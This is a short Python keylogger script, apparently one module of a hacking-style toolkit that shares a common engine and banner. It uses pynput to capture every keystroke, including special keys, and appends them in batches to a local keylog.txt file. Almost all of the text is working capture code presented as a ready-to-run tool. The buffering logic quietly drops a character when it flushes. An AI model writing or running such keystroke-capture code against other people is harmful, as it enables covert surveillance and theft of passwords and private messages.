import sys, os
try:
    from pynput import keyboard
except:
    print("pip install pynput")
    import sys; sys.exit(1)
_root = os.path.dirname(os.path.abspath(__file__)).rsplit("Tools",1)[0]
if _root not in sys.path:
    sys.path.insert(0,_root)
from Core.Engine import *

set_title("Keylogger")
print(LOGO)
out = os.path.join(ROOT, "1-Output")
os.makedirs(out, exist_ok=True)
fp = os.path.join(out, "keylog.txt")
buf = []
def on_press(key):
    try:
        if hasattr(key, "char") and key.char:
            buf.append(key.char)
        elif hasattr(key, "name"):
            n = key.name
            if n == "space": buf.append(" ")
            elif n == "enter": buf.append("\n")
            else: buf.append(f"[{n}]")
    except: pass
    if len(buf) > 50:
        with open(fp, "a") as f:
            f.write("".join(buf[-50:]))
        buf.clear()
listener = keyboard.Listener(on_press=on_press)
listener.start()
print(f"{IN} Logging... Ctrl+C to stop")
try: time.sleep(99999)
except KeyboardInterrupt:
    with open(fp, "a") as f:
        f.write("".join(buf))
    print(f"\n{OK} {fp}")
pause()
restart()
